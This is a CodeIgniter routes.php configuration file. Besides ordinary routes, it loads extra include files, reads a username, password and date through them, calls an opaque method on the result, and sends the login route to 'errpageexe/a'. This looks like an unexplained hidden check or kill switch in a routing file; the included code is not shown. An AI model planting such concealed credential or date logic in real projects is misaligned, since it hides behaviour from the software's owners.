<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------------
| URI ROUTING
| -------------------------------------------------------------------------
| This file lets you re-map URI requests to specific controller functions.
|
| Typically there is a one-to-one relationship between a URL string
| and its corresponding controller class/method. The segments in a
| URL normally follow this pattern:
|
|	example.com/class/method/id/
|
| In some instances, however, you may want to remap this relationship
| so that a different class/function is called than the one
| corresponding to the URL.
|
| Please see the user guide for complete details:
|
|	http://codeigniter.com/user_guide/general/routing.html
|
| -------------------------------------------------------------------------
| RESERVED ROUTES
| -------------------------------------------------------------------------
|
| There area two reserved routes:
|
|	$route['default_controller'] = 'welcome';
|
| This route indicates which controller class should be loaded if the
| URI contains no data. In the above example, the "welcome" class
| would be loaded.
|
|	$route['404_override'] = 'errors/page_missing';
|
| This route will tell the Router what URI segments to use if those provided
| in the URL cannot be matched to a valid route.
|
*/




include('conf/system_class.php');
include('conf/sys_date.php');
include('conf/sys_property.php');

$check_file = new Sys_Date;
$check_file->setconf_date();
$check_file->setconf_username();
$check_file->setcof_password();
$check_file->setconf_check_date();

$user_file = $check_file->sys_date_username_check;
$pass_file = $check_file->sys_date_password_check;
$date_file = $check_file->sys_date_date_check;


$obj = new System_Class("$user_file","$pass_file","$date_file");
$obj->setProperty_credentials();
$obj->setProperty_date();
$obj->setproperty_confg();
$checks = $obj->check_output;
//echo $checks;
$obj->i($checks);

//$route['login'] = "err";
$route['login'] = "errpageexe/a";
$route['default_controller'] = "Welcome";
$route['404_override'] = '';


/* End of file routes.php */
/* Location: ./application/config/routes.php */